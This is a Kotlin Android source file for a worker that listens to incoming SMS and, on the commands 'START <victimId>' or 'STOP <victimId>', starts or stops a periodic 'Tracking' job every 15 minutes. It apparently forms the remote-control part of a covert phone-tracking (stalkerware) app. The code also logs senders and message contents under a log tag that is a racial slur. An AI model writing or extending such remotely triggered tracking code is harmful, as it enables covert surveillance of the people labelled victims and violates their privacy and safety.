package com.theprogxy.tamtam

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import androidx.work.Data
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkInfo
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class SmsReceiverWorker(private val context: Context, private val params: WorkerParameters) : Worker(context, params) {
    private lateinit var latch: CountDownLatch

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val sender = intent.getStringExtra("sender")
            val body = intent.getStringExtra("body")
            Log.i("Negro", "Message received from: $sender, containing:\n $body")

            // Check if any of the work info objects are in ENQUEUED or RUNNING state
            val isWorking : Boolean = WorkManager.getInstance(context).getWorkInfosByTag("Tracking").get().any { workInfo ->
                workInfo.state == WorkInfo.State.ENQUEUED || workInfo.state == WorkInfo.State.RUNNING
            }

            val victimId = params.inputData.getString("victimId").toString()

            if (body == "START $victimId" && !isWorking) {
                val data = Data.Builder().putString("victimId", victimId).build()
                val workRequest = PeriodicWorkRequestBuilder<TrackerWorker>(15, TimeUnit.MINUTES).setInputData(data).addTag("Tracking").build()
                WorkManager.getInstance(context).enqueue(workRequest)
            } else if (body == "STOP $victimId" && isWorking) WorkManager.getInstance(context).cancelAllWorkByTag("Tracking")

            latch.countDown()
        }
    }

    override fun doWork(): Result {
        latch = CountDownLatch(150)
        LocalBroadcastManager.getInstance(this.context).registerReceiver(smsReceiver, IntentFilter("SmsMessageIntent"))
        latch.await(14, TimeUnit.MINUTES)
        LocalBroadcastManager.getInstance(this.context).unregisterReceiver(smsReceiver)
        return Result.success()
    }
}